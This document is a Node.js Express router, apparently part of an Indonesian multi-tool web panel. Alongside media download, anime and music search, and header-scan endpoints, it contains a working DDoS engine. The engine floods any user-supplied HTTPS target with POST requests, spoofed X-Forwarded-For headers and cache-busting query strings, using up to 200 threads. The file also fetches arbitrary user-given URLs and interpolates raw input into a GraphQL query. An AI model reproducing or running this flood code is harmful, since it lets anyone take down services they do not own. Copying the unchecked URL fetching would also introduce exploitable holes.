const express = require('express');
const router = express.Router();
const axios = require('axios');
const https = require('https');
const http = require('http');
const { URL } = require('url');
const fs = require('fs');
const path = require('path');

let ddosState = { running: false, target: null, requests: 0, success: 0, failed: 0, startedAt: 0, activeSockets: new Set() };

// (Kode Video, Gmail, Anime, Music, Scan tetap sama)
router.post('/video', async (req, res) => {
  try {
    const { url } = req.body;
    if (!url) return res.status(400).json({ ok: false, msg: 'Missing url' });
    if (url.includes('tiktok.com')) {
      const r = await axios.post('https://www.tikwm.com/api/', { url, hd: 1 }, { headers: { 'User-Agent': 'Mozilla/5.0' } });
      if (r.data && r.data.code === 0 && r.data.data) {
        let v = r.data.data.play; if (v.startsWith('http://')) v = v.replace('http://', 'https://');
        return res.json({ ok: true, result: { title: r.data.data.title || 'Video', video: v } });
      }
      return res.status(400).json({ ok: false, msg: 'Gagal TikTok.' });
    }
    res.json({ ok: true, url, msg: 'Siap.' });
  } catch (e) { res.status(500).json({ ok: false, msg: 'Error' }); }
});
router.get('/download', async (req, res) => {
  try {
    const { url, filename } = req.query;
    if (!url) return res.status(400).send('URL required');
    const response = await axios({ method: 'get', url: url, responseType: 'stream', headers: { 'User-Agent': 'Mozilla/5.0' } });
    res.setHeader('Content-Disposition', `attachment; filename="${filename || 'file.mp4'}"`);
    res.setHeader('Content-Type', 'application/octet-stream');
    response.data.pipe(res);
  } catch (e) { res.status(500).send('Gagal download.'); }
});
router.get('/gmail', (req, res) => { res.json({ ok: true, email: `${Math.random().toString(36).substring(7)}@mail.tm`, password: 'pass123' }); });
router.get('/anime', async (req, res) => {
  try {
    const gql = `query { Page(perPage: 10) { media(search: "${req.query.q || 'naruto'}", type: ANIME) { id title { romaji english } coverImage { large } } } }`;
    const r = await axios.post('https://graphql.anilist.co', { query: gql });
    res.json({ ok: true, data: r.data.data.Page.media });
  } catch (e) { res.status(500).json({ ok: false, msg: 'Error' }); }
});
router.get('/music', async (req, res) => {
  try {
    const r = await axios.get('https://itunes.apple.com/search', { params: { term: req.query.q || 'lofi', media: 'music', limit: 10 } });
    res.json({ ok: true, data: r.data.results });
  } catch (e) { res.status(500).json({ ok: false, msg: 'Error' }); }
});
router.post('/scan', async (req, res) => {
  try {
    const r = await axios.get(req.body.url, { timeout: 8000, validateStatus: () => true }).catch(() => ({ status: 408, headers: {} }));
    const f = []; if (!r.headers['content-security-policy']) f.push('No CSP'); if (!r.headers['x-frame-options']) f.push('No XFO');
    res.json({ ok: true, url: req.body.url, status: r.status, findings: f, server: r.headers['server'] || 'Unknown' });
  } catch (e) { res.status(500).json({ ok: false, msg: 'Error' }); }
});

// === ENGINE DDOS HTTP/1.1 (LEBIH STABIL) ===
function attack(targetUrl, stats, io) {
  try {
    const parsed = new URL(targetUrl);
    const options = {
      hostname: parsed.hostname,
      port: 443,
      path: parsed.pathname + '?bypass=' + Math.random().toString(36).substring(7),
      method: 'POST',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': 1000,
        'Connection': 'keep-alive',
        'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
      },
      timeout: 4000
    };

    const req = https.request(options, (res) => {
      stats.success++;
      io.emit('ddos:stats', { ...stats, activeSockets: stats.activeSockets.size });
      res.on('data', () => {});
    });

    req.on('error', () => { stats.failed++; });
    req.write('a='.repeat(500));
    req.end();
    stats.requests++;
  } catch (e) { stats.failed++; }
}

router.post('/ddos', async (req, res) => {
  try {
    let { target, duration, threads } = req.body;
    target = target.replace(/[, ]+$/, "");
    if (!target.startsWith('https://')) return res.status(400).json({ ok: false, msg: 'Wajib https://' });
    if (ddosState.running) return res.status(400).json({ ok: false, msg: 'DDoS sedang berjalan' });
    
    const dur = Math.min(Number(duration) || 10, 120);
    const th = Math.min(Number(threads) || 10, 200);
    
    ddosState = { running: true, target, requests: 0, success: 0, failed: 0, startedAt: Date.now(), activeSockets: new Set() };
    const io = req.app.get('io');
    res.json({ ok: true, msg: 'Started', state: ddosState });
    
    (async () => {
      const end = Date.now() + dur * 1000;
      while (ddosState.running && Date.now() < end) {
        const promises = [];
        for (let i = 0; i < th; i++) {
          promises.push(new Promise(resolve => {
            attack(target, ddosState, io);
            resolve();
          }));
        }
        await Promise.all(promises);
        await new Promise(r => setTimeout(r, 100));
      }
      ddosState.running = false;
      io.emit('ddos:done', ddosState);
    })();
  } catch (e) { res.status(500).json({ ok: false, msg: e.message }); }
});

router.post('/ddos/stop', (req, res) => {
  if (!ddosState.running) return res.status(400).json({ ok: false, msg: 'Tidak berjalan' });
  ddosState.running = false;
  res.json({ ok: true, msg: 'Dihentikan.' });
});

module.exports = router;
